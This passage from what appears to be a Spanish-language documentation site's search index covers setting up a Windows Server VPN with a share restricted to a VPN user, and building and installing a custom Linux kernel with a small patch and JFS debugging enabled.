t\u00fanel VPN, verificando as\u00ed que la conexi\u00f3n est\u00e1 activa y que el usuario dispone de los permisos adecuados para interactuar con el recurso. Para finalizar la comprobaci\u00f3n, se accede nuevamente al recurso compartido VPNShare desde el cliente conectado por VPN y se confirma que el archivo test.txt es visible y accesible. La ventana del s\u00edmbolo del sistema muestra el hostname del equipo cliente, lo que verifica que el acceso se realiza realmente desde la m\u00e1quina remota a trav\u00e9s del t\u00fanel VPN. Con esto se confirma que la configuraci\u00f3n es correcta y que \u00fanicamente el usuario autenticado por VPN puede acceder a la carpeta protegida.","title":"VPN"},{"location":"VPN/vpn/#servidor-vpn","text":"","title":"Servidor VPN"},{"location":"VPN/vpn/#instalacion-de-caracteristicas","text":"Para poder levantar un servidor VPN es necesario agregar el rol Acceso remoto desde el asistente de Windows Server. Dentro de este rol se incluyen los servicios DirectAccess y VPN (RAS) junto con el componente de Enrutamiento, ambos necesarios para permitir conexiones remotas y gestionar el tr\u00e1fico del t\u00fanel VPN.","title":"Instalaci\u00f3n de Caracter\u00edsticas"},{"location":"VPN/vpn/#configuracion-del-servidor","text":"Una vez instalado el rol correspondiente, se accede a la consola de administraci\u00f3n desde el men\u00fa Herramientas del Administrador del servidor. Dentro de este men\u00fa se debe seleccionar la opci\u00f3n Enrutamiento y acceso remoto, que permitir\u00e1 iniciar la configuraci\u00f3n del servicio VPN y habilitar las funciones necesarias para gestionar conexiones remotas. Para continuar con la configuraci\u00f3n, se selecciona el servidor dentro de la consola y se utiliza la opci\u00f3n Configurar y habilitar Enrutamiento y acceso remoto. Esto inicia el asistente que permitir\u00e1 activar los servicios necesarios para que el servidor funcione como punto de acceso VPN y gestione las conexiones entrantes. Para continuar con el asistente, se selecciona la opci\u00f3n Acceso remoto (acceso telef\u00f3nico o red privada virtual). Esta configuraci\u00f3n habilita al servidor para aceptar conexiones remotas mediante VPN, permitiendo que los clientes externos puedan autenticarse y establecer un t\u00fanel seguro hacia la red interna. En este paso se habilita espec\u00edficamente la opci\u00f3n VPN, indicando que el servidor actuar\u00e1 como puerta de enlace para recibir conexiones remotas a trav\u00e9s de Internet. Al seleccionar esta opci\u00f3n, el asistente prepara la configuraci\u00f3n necesaria para que los clientes puedan establecer un t\u00fanel seguro hacia la red interna del servidor. En este punto se selecciona la interfaz de red que el servidor utilizar\u00e1 para recibir las conexiones VPN. Se escoge la interfaz conectada hacia Internet o hacia la red externa, ya que ser\u00e1 la encargada de gestionar el tr\u00e1fico entrante de los clientes remotos. Esta selecci\u00f3n permite al asistente configurar las rutas y reglas necesarias para que el t\u00fanel VPN funcione correctamente. Para continuar con la configuraci\u00f3n, se selecciona la opci\u00f3n Autom\u00e1ticamente para la asignaci\u00f3n de direcciones IP. Con esta opci\u00f3n, el servidor utilizar\u00e1 el servicio DHCP existente para entregar direcciones a los clientes VPN; en caso de no haber un DHCP disponible, el propio servidor generar\u00e1 las direcciones de forma interna. Esto permite que los clientes remotos obtengan una IP v\u00e1lida dentro del rango configurado al establecer el t\u00fanel. En este paso se indica que la autenticaci\u00f3n de las solicitudes se gestionar\u00e1 directamente desde Enrutamiento y acceso remoto, por lo que se selecciona la opci\u00f3n No, usar Enrutamiento y acceso remoto para autenticar las solicitudes de conexi\u00f3n. Con esto, el propio servidor ser\u00e1 el encargado de validar las credenciales de los usuarios que intenten conectarse mediante VPN, sin necesidad de integrar un servidor RADIUS externo. Tras completar todas las fases del asistente, se muestra un resumen indicando la interfaz por la que los clientes VPN se conectar\u00e1n, as\u00ed como la red que se asignar\u00e1 para el direccionamiento interno. Con esta informaci\u00f3n confirmada, solo queda finalizar el asistente para que el servicio de Enrutamiento y acceso remoto quede habilitado y el servidor empiece a funcionar como servidor VPN.","title":"Configuraci\u00f3n del Servidor"},{"location":"VPN/vpn/#configurar-el-rango-de-direcciones-para-los-clientes-del-tunel-vpn","text":"Para definir qu\u00e9 direcciones IP recibir\u00e1n los clientes que se conecten al t\u00fanel VPN, se accede a las propiedades del servidor dentro de Enrutamiento y acceso remoto. En la pesta\u00f1a IPv4, se selecciona la opci\u00f3n Conjunto de direcciones est\u00e1ticas y se utiliza el bot\u00f3n Agregar para establecer el rango que se asignar\u00e1 de forma exclusiva a los usuarios conectados mediante VPN. Para permitir que el usuario pueda autenticarse mediante VPN, se accede a sus propiedades y dentro de la pesta\u00f1a Marcado se habilita la opci\u00f3n Permitir acceso. Con este ajuste, el servidor autoriza expl\u00edcitamente a esta cuenta para establecer conexiones remotas a trav\u00e9s del servicio de Enrutamiento y acceso remoto, asegurando que solo usuarios aprobados puedan acceder al t\u00fanel VPN.","title":"Configurar el rango de direcciones para los clientes del t\u00fanel VPN"},{"location":"VPN/vpn/#configuracion-de-la-conexion-vpn-en-el-cliente","text":"En el equipo cliente se procede a crear la conexi\u00f3n VPN introduciendo la informaci\u00f3n necesaria: un nombre identificativo para la conexi\u00f3n, la direcci\u00f3n IP del servidor VPN y el protocolo a utilizar. Tambi\u00e9n se especifican las credenciales del usuario autorizado para establecer el t\u00fanel. Estos par\u00e1metros permiten que el cliente pueda autenticar correctamente la conexi\u00f3n y comunicarse con el servidor de forma segura. Una vez creada la conexi\u00f3n VPN en el cliente, esta aparece disponible en el panel de configuraci\u00f3n, permitiendo gestionarla directamente desde el sistema. En este punto se puede revisar su estado, acceder a las opciones avanzadas y preparar la conexi\u00f3n para su uso. Tras iniciar la conexi\u00f3n, el cliente establece correctamente el t\u00fanel con el servidor VPN y el estado cambia a Conectado. Desde esta misma ventana es posible mantener la sesi\u00f3n activa o desconectarla cuando sea necesario, verificando as\u00ed que la comunicaci\u00f3n con el servidor se realiza de forma correcta.","title":"Configuraci\u00f3n de la conexi\u00f3n VPN en el cliente"},{"location":"VPN/vpn/#configuracion-de-la-carpeta-accesible-unicamente-por-el-usuario-vpn","text":"Para proteger el recurso compartido y asegurar que \u00fanicamente el usuario conectado por VPN pueda acceder, se crea una carpeta dedicada y se configura como recurso compartido. Desde las propiedades de la carpeta se habilita el uso compartido y se asigna un nombre identificativo accesible a trav\u00e9s de la red. Este paso permite que la carpeta pueda ser alcanzada mediante el t\u00fanel VPN una vez que el usuario est\u00e9 autenticado. Para definir correctamente qui\u00e9n puede acceder al recurso compartido, se selecciona \u00fanicamente al usuario destinado para la VPN y se le asignan los permisos necesarios. En este caso, se agrega el usuario vpnuser y se establece su nivel de permiso en Lectura y escritura, garantizando que solo \u00e9l pueda interactuar con la carpeta cuando acceda a trav\u00e9s del t\u00fanel VPN. Los dem\u00e1s usuarios mantienen permisos restringidos o no tienen acceso, reforzando el control de seguridad del recurso. Para comprobar el acceso a la carpeta compartida desde el cliente conectado por VPN, se utiliza el comando Ejecutar introduciendo la ruta UNC del recurso. Al indicar \\WIN-S7UCV5BGJGB\\VPNShare, el sistema intenta acceder directamente a la carpeta a trav\u00e9s del t\u00fanel VPN, verificando as\u00ed que la conexi\u00f3n est\u00e1 activa y que el usuario dispone de los permisos adecuados para interactuar con el recurso. Para finalizar la comprobaci\u00f3n, se accede nuevamente al recurso compartido VPNShare desde el cliente conectado por VPN y se confirma que el archivo test.txt es visible y accesible. La ventana del s\u00edmbolo del sistema muestra el hostname del equipo cliente, lo que verifica que el acceso se realiza realmente desde la m\u00e1quina remota a trav\u00e9s del t\u00fanel VPN. Con esto se confirma que la configuraci\u00f3n es correcta y que \u00fanicamente el usuario autenticado por VPN puede acceder a la carpeta protegida.","title":"Configuraci\u00f3n de la carpeta accesible \u00fanicamente por el usuario VPN"},{"location":"kernel/kernel_linux/","text":"Gesti\u00f3n de Kernels Configuraci\u00f3n y parches En esta primera captura se puede ver el proceso para preparar la modificaci\u00f3n del kernel. Acceder al directorio init dentro del c\u00f3digo fuente de Linux, donde se encuentran los archivos que controlan la inicializaci\u00f3n del sistema. Crear una copia del archivo main.c con el nombre main.c.personalizado para trabajar sobre \u00e9l sin alterar el original. Abrir el archivo copiado con el editor nano para realizar las modificaciones. En la segunda captura se puede ver el contenido editado. A\u00f1adir dos mensajes mediante la funci\u00f3n pr_notice() para que se muestren en el log del sistema durante el arranque: uno indicando \u201cEl sistema est\u00e1 listo, yo no tanto\u201d y otro con el nombre \u201cDariel\u201d. Personalizar el kernel y recompilarlo para aplicar los cambios. En esta parte se puede observar c\u00f3mo generar el parche que contiene las diferencias entre el archivo original y el modificado. Ejecutar el comando diff -u main.c main.c.personalizado > parche1.patch para crear un fichero que almacene los cambios realizados. Este archivo permitir\u00e1 aplicar la modificaci\u00f3n sin necesidad de reemplazar todo el c\u00f3digo fuente. Despu\u00e9s, comprobar el contenido del directorio para confirmar que el parche se ha creado correctamente junto a los dem\u00e1s archivos. Este paso es clave para distribuir la personalizaci\u00f3n de forma ordenada y reutilizable. Se intenta aplicar el parche creado anteriormente usando el comando patch -p1 < parche1.patch. El sistema indica que no encuentra el archivo a parchear debido a la ruta, lo que sugiere que se debe ajustar la opci\u00f3n -p o la ubicaci\u00f3n del fichero. Finalmente, se confirma que el contenido del archivo main.c incluye la l\u00ednea personalizada mediante el comando grep Dariel main.c. Se procede a editar el archivo de configuraci\u00f3n de GRUB ubicado en /etc/default/grub utilizando el editor nano. Este paso es necesario para ajustar par\u00e1metros relacionados con el arranque del sistema antes de compilar y probar el kernel modificado. Lo \u00fanico que se realiza es comentar las l\u00edneas resaltadas. se ejecuta el comando update-grub para aplicar los cambios realizados en la configuraci\u00f3n. El sistema genera el archivo de configuraci\u00f3n actualizado y detecta las im\u00e1genes del kernel disponibles en /boot, incluyendo la versi\u00f3n que se ha personalizado. Este paso asegura que el gestor de arranque reconozca el nuevo kernel antes de reiniciar. En este paso se ejecuta el comando make menuconfig para abrir la interfaz de configuraci\u00f3n del kernel. Este comando permite personalizar las opciones de compilaci\u00f3n mediante un men\u00fa interactivo, donde se pueden habilitar o deshabilitar caracter\u00edsticas espec\u00edficas del kernel antes de proceder a la compilaci\u00f3n. Una vez abierto el men\u00fa de configuraci\u00f3n del kernel con make menuconfig, acceder al apartado File systems para revisar las opciones relacionadas con los sistemas de archivos. Dentro de este submen\u00fa, localizar la opci\u00f3n JFS debugging, que inicialmente aparece deshabilitada, y proceder a activarla. Este cambio permite compilar el kernel con soporte de depuraci\u00f3n para el sistema de archivos JFS, lo que resulta \u00fatil para diagnosticar problemas y analizar su comportamiento en entornos donde se utilice este tipo de sistema. Despu\u00e9s de realizar los cambios en la configuraci\u00f3n del kernel, guardar la configuraci\u00f3n en el archivo .config cuando el sistema lo solicita, confirmando el nombre por defecto. A continuaci\u00f3n, verificar que el archivo se ha creado correctamente utilizando el comando ls -la | grep .config, donde se muestra el fichero .config junto a otros archivos relacionados con la configuraci\u00f3n del kernel. Este paso asegura que las opciones seleccionadas en el men\u00fa se han guardado y est\u00e1n listas para la compilaci\u00f3n. Despu\u00e9s de guardar la configuraci\u00f3n, preparar el entorno para la compilaci\u00f3n ejecutando el comando make prepare, lo que sincroniza y genera los archivos necesarios para iniciar el proceso. A continuaci\u00f3n, comenzar la construcci\u00f3n del paquete del kernel utilizando make-kpkg --initrd kernel_image kernel_headers, que crea la imagen del kernel y los encabezados, adem\u00e1s de generar los scripts y directorios requeridos para empaquetar el kernel en formato compatible con Debian. Este paso es esencial para poder instalar el kernel personalizado en el sistema. Despu\u00e9s de completar la compilaci\u00f3n y empaquetado del kernel, comprobar el contenido del directorio para confirmar la generaci\u00f3n de los archivos .deb. En la imagen se observa la presencia de linux-headers y linux-image, ambos con la versi\u00f3n personalizada y preparados para su instalaci\u00f3n en el sistema. Estos paquetes son esenciales: los headers permiten compilar m\u00f3dulos adicionales y la imagen contiene el kernel listo para ser usado. Finalmente, instalar el kernel personalizado utilizando el comando dpkg -i linux-image-6.8.1_6.8.1-10.00.Custom_amd64.deb. Durante el proceso, el sistema desempaqueta el archivo y ejecuta los scripts necesarios en /etc/kernel/preinst.d, preparando la imagen del kernel para su uso. Este paso confirma que la instalaci\u00f3n se realiza correctamente y que el nuevo kernel queda registrado en el sistema, listo para ser utilizado en el pr\u00f3ximo arranque. Tras reiniciar el sistema, comprobar en el men\u00fa de GRUB que aparece la nueva entrada correspondiente al kernel personalizado, en este caso la versi\u00f3n 6.8.1, lo que indica que la instalaci\u00f3n se realiz\u00f3 correctamente. Una vez iniciado el sistema con este kernel, verificar la versi\u00f3n activa mediante el comando uname -r y confirmar que la opci\u00f3n habilitada en la configuraci\u00f3n, JFS debugging, est\u00e1 presente utilizando grep JFS_DEBUG /boot/config-$(uname -r), donde se muestra el valor CONFIG_JFS_DEBUG=y. Este resultado confirma que los cambios aplicados durante la compilaci\u00f3n se han integrado en el kernel en ejecuci\u00f3n.","title":"Gesti\u00f3n de Kernels"},{"location":"kernel/kernel_linux/#gestion-de-kernels","text":"","title":"Gesti\u00f3n de Kernels"},{"location":"kernel/kernel_linux/#configuracion-y-parches","text":"En esta primera captura se puede ver el proceso para preparar la modificaci\u00f3n del kernel. Acceder al directorio init dentro del c\u00f3digo fuente de Linux, donde se encuentran los archivos que controlan la inicializaci\u00f3n del sistema. Crear una copia del archivo main.c con el nombre main.c.personalizado para trabajar sobre \u00e9l sin alterar el original. Abrir el archivo copiado con el editor nano para realizar las modificaciones. En la segunda captura se puede ver el contenido editado. A\u00f1adir dos mensajes mediante la funci\u00f3n pr_notice() para que se muestren en el log del sistema durante el arranque: uno indicando \u201cEl sistema est\u00e1 listo, yo no tanto\u201d y otro con el nombre \u201cDariel\u201d. Personalizar el kernel y recompilarlo para aplicar los cambios. En esta parte se puede observar c\u00f3mo generar el parche que contiene las diferencias entre el archivo original y el modificado. Ejecutar el comando diff -u main.c main.c.personalizado > parche1.patch para crear un fichero que almacene los cambios realizados. Este archivo permitir\u00e1 aplicar la modificaci\u00f3n sin necesidad de reemplazar todo el c\u00f3digo fuente. Despu\u00e9s, comprobar el contenido del directorio para confirmar que el parche se ha creado correctamente junto a los dem\u00e1s archivos. Este paso es clave para distribuir la personalizaci\u00f3n de forma ordenada y reutilizable. Se intenta aplicar el parche creado anteriormente usando el comando patch -p1 < parche1.patch. El sistema indica que no encuentra el archivo a parchear debido a la ruta, lo que sugiere que se debe ajustar la opci\u00f3n -p o la ubicaci\u00f3n del fichero. Finalmente, se confirma que el contenido del archivo main.c incluye la l\u00ednea personalizada mediante el comando grep Dariel main.c. Se procede a editar el archivo de configuraci\u00f3n de GRUB ubicado en /etc/default/grub utilizando el editor nano. Este paso es necesario para ajustar par\u00e1metros relacionados con el arranque del sistema antes de compilar y probar el kernel modificado. Lo \u00fanico que se realiza es comentar las l\u00edneas resaltadas. se ejecuta el comando update-grub para aplicar los cambios realizados en la configuraci\u00f3n. El sistema genera el archivo de configuraci\u00f3n actualizado y detecta las im\u00e1genes del kernel disponibles en /boot, incluyendo la versi\u00f3n que se ha personalizado. Este paso asegura que el gestor de arranque reconozca el nuevo kernel antes de reiniciar. En este paso se ejecuta el comando make menuconfig para abrir la interfaz de configuraci\u00f3n del kernel. Este comando permite personalizar las opciones de compilaci\u00f3n mediante un men\u00fa interactivo, donde se pueden habilitar o deshabilitar caracter\u00edsticas espec\u00edficas del kernel antes de proceder a la compilaci\u00f3n. Una vez abierto el men\u00fa de configuraci\u00f3n del kernel con make menuconfig, acceder al apartado File systems para revisar las opciones relacionadas con los sistemas de archivos. Dentro de este submen\u00fa, localizar la opci\u00f3n JFS debugging, que inicialmente aparece deshabilitada, y proceder a activarla. Este cambio permite compilar el kernel con soporte de depuraci\u00f3n para el sistema de archivos JFS, lo que resulta \u00fatil para diagnosticar problemas y analizar su comportamiento en entornos donde se utilice este tipo de sistema. Despu\u00e9s de realizar los cambios en la configuraci\u00f3n del kernel, guardar la configuraci\u00f3n en el archivo .config cuando el sistema lo solicita, confirmando el nombre por defecto. A continuaci\u00f3n, verificar que el archivo se ha creado correctamente utilizando el comando ls -la | grep .config, donde se muestra el fichero .config junto a otros archivos relacionados con la configuraci\u00f3n del kernel. Este paso asegura que las opciones seleccionadas en el men\u00fa se han guardado y est\u00e1n listas para la compilaci\u00f3n. Despu\u00e9s de guardar la configuraci\u00f3n, preparar el entorno para la compilaci\u00f3n ejecutando el comando make prepare, lo que sincroniza y genera los archivos necesarios para iniciar el proceso. A continuaci\u00f3n, comenzar la construcci\u00f3n del paquete del kernel utilizando make-kpkg --initrd kernel_image kernel_headers, que crea la imagen del kernel y los encabezados, adem\u00e1s de generar los scripts y directorios requeridos para empaquetar el kernel en formato compatible con Debian. Este paso es esencial para poder instalar el kernel personalizado en el sistema. Despu\u00e9s de completar la compilaci\u00f3n y empaquetado del kernel, comprobar el contenido del directorio para confirmar la generaci\u00f3n de los archivos .deb. En la imagen se observa la presencia de linux-headers y linux-image, ambos con la versi\u00f3n personalizada y preparados para su instalaci\u00f3n en el sistema. Estos paquetes son esenciales: los headers permiten compilar m\u00f3dulos adicionales y la imagen contiene el kernel listo para ser usado. Finalmente, instalar el kernel personalizado utilizando el comando dpkg -i linux-image-6.8.1_6.8.1-10.00.Custom_amd64.deb. Durante el proceso, el sistema desempaqueta el archivo y ejecuta los scripts necesarios en /etc/kernel/preinst.d, preparando la imagen del kernel para su uso. Este paso confirma que la instalaci\u00f3n se realiza correctamente y que el nuevo kernel queda registrado en el sistema, listo para ser utilizado en el pr\u00f3ximo arranque. Tras reiniciar el sistema, comprobar en el men\u00fa de GRUB que aparece la nueva entrada correspondiente al kernel personalizado, en este caso la versi\u00f3n 6.8.1, lo que indica que la instalaci\u00f3n se realiz\u00f3 correctamente. Una vez iniciado el sistema con este kernel, verificar la versi\u00f3n activa mediante el comando uname -r y confirmar que la opci\u00f3n habilitada en la configuraci\u00f3n, JFS debugging, est\u00e1 presente utilizando grep JFS_DEBUG /boot/config-$(uname -r), donde se muestra el valor CONFIG_JFS_DEBUG=y. Este resultado confirma que los cambios aplicados durante la compilaci\u00f3n se han integrado en el kernel en ejecuci\u00f3n.","title":"Configuraci\u00f3n y parches"}]}